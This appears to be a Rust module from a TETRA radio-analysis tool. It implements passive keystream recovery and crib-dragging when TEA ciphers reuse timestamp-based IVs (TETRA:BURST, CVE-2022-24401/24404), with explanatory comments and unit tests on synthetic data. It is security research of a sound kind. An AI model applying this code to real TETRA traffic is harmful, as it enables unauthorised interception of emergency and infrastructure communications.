//! Passive keystream recovery from re-used timestamps (TETRA:BURST section
//! 5.1, CVE-2022-24401/24404).
//!
//! Every TEA cipher keys its keystream from an IV built entirely out of the
//! timestamp the cell broadcasts unencrypted: hyperframe, multiframe, frame,
//! slot and a direction bit. If the network does not re-key inside the IV's
//! period (about 23 days), the same timestamp comes round again and the cipher
//! emits the *same keystream* a second time, whatever the cipher is. Two
//! ciphertexts under one IV therefore satisfy
//!
//!   c1 ^ c2 = (ks ^ m1) ^ (ks ^ m2) = m1 ^ m2
//!
//! the keystream gone. This is a crib-drag, not a key: it needs one plaintext
//! known (or guessable from context, such as a fixed PDU header or a silence
//! frame) to read the other, and it decrypts only that timestamp. Unlike the
//! TEA1 key search it says nothing about other timestamps and yields no key,
//! but it is the one passive path that touches TEA2/3/4 at all.
//!
//! This module is the arithmetic and a store of what has been seen; the node
//! decides what counts as a known plaintext.

use crate::tea::Timestamp;
use std::collections::HashMap;

/// `a ^ b` over the shorter length: `m1 ^ m2` from two ciphertexts, or a
/// plaintext from a ciphertext and its keystream.
pub fn xor(a: &[u8], b: &[u8]) -> Vec<u8> {
    a.iter().zip(b).map(|(x, y)| x ^ y).collect()
}

/// The keystream for a timestamp, recovered from a ciphertext whose plaintext
/// is known: `ks = c ^ m`. Only as long as the known plaintext.
pub fn keystream_from_known(ciphertext: &[u8], known_plaintext: &[u8]) -> Vec<u8> {
    xor(ciphertext, known_plaintext)
}

/// Decrypt a ciphertext with keystream already recovered for its timestamp.
pub fn decrypt_with_keystream(ciphertext: &[u8], keystream: &[u8]) -> Vec<u8> {
    xor(ciphertext, keystream)
}

/// A ciphertext seen at a timestamp, with the payload identity so a genuine
/// re-use (same IV, *different* traffic) is told from the same frame decoded
/// twice.
#[derive(Clone, Debug)]
pub struct Seen {
    pub ct: Vec<u8>,
    /// A tag that differs when the underlying traffic differs: the address,
    /// or a hash of the surrounding frame. Two `Seen` at one IV with distinct
    /// tags are the re-use a crib-drag wants.
    pub tag: u64,
}

/// What a re-used IV yields: the two ciphertexts and their `m1 ^ m2`.
#[derive(Clone, Debug)]
pub struct Reuse {
    pub iv: u32,
    pub a: Vec<u8>,
    pub b: Vec<u8>,
    /// `a ^ b == m1 ^ m2`: the crib-drag surface.
    pub xor: Vec<u8>,
}

/// Ciphertexts seen per IV, watching for a timestamp that comes round again
/// carrying different traffic. Bounded: one prior ciphertext per IV is kept,
/// which is all a pairwise crib-drag needs.
#[derive(Default)]
pub struct ReuseWatch {
    seen: HashMap<u32, Seen>,
}

impl ReuseWatch {
    pub fn new() -> Self {
        Self::default()
    }

    /// Record a ciphertext at `ts`. Returns a [`Reuse`] when this IV was seen
    /// before carrying different traffic: the keystream cancels across the
    /// pair, so `xor` is `m1 ^ m2`.
    pub fn observe(&mut self, ts: &Timestamp, ct: Vec<u8>, tag: u64) -> Option<Reuse> {
        let iv = ts.iv();
        match self.seen.get(&iv) {
            // A different payload at the same IV: the re-use we are after.
            Some(prev) if prev.tag != tag => {
                let xor = xor(&prev.ct, &ct);
                let reuse = Reuse { iv, a: prev.ct.clone(), b: ct.clone(), xor };
                // Keep the newer one for the next round.
                self.seen.insert(iv, Seen { ct, tag });
                Some(reuse)
            }
            // Same payload (a re-decode) or first sighting: just remember it.
            _ => {
                self.seen.insert(iv, Seen { ct, tag });
                None
            }
        }
    }

    /// Ciphertexts remembered so far.
    pub fn len(&self) -> usize {
        self.seen.len()
    }

    pub fn is_empty(&self) -> bool {
        self.seen.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tea::{keystream, Key};

    fn ts(frame: u8) -> Timestamp {
        Timestamp { tn: 1, frame, multiframe: 30, hyperframe: 110, uplink: false }
    }

    /// A crib-drag: with the keystream cancelled, a known plaintext on one
    /// side reads the other. The cipher never enters the recovery.
    #[test]
    fn reused_iv_reveals_the_other_plaintext() {
        // Same IV, so the cipher emits identical keystream for both.
        let ks = keystream(&Key::Tea2([9u8; 10]), &ts(6), 8);
        let m1 = b"HELLO 12";
        let m2 = b"WORLD 34";
        let c1 = xor(m1, &ks);
        let c2 = xor(m2, &ks);

        let mut w = ReuseWatch::new();
        assert!(w.observe(&ts(6), c1.clone(), 1).is_none(), "first sighting");
        let reuse = w.observe(&ts(6), c2.clone(), 2).expect("re-use detected");

        // xor is m1 ^ m2; knowing m1 gives m2 with no key and no cipher.
        assert_eq!(xor(&reuse.xor, m1), m2);
        // And the keystream itself falls out of either known plaintext.
        let ks_rec = keystream_from_known(&c1, m1);
        assert_eq!(ks_rec, ks);
        assert_eq!(decrypt_with_keystream(&c2, &ks_rec), m2);
    }

    /// The same frame decoded twice is not a re-use: identical tag, ignored.
    #[test]
    fn a_redecode_is_not_a_reuse() {
        let mut w = ReuseWatch::new();
        let c = vec![1, 2, 3, 4];
        assert!(w.observe(&ts(6), c.clone(), 7).is_none());
        assert!(w.observe(&ts(6), c.clone(), 7).is_none(), "same tag, not re-use");
    }

    /// Different IVs never collide, however similar the traffic.
    #[test]
    fn distinct_timestamps_do_not_collide() {
        let mut w = ReuseWatch::new();
        assert!(w.observe(&ts(6), vec![1, 2, 3, 4], 1).is_none());
        assert!(w.observe(&ts(7), vec![5, 6, 7, 8], 2).is_none(), "different IV");
    }
}
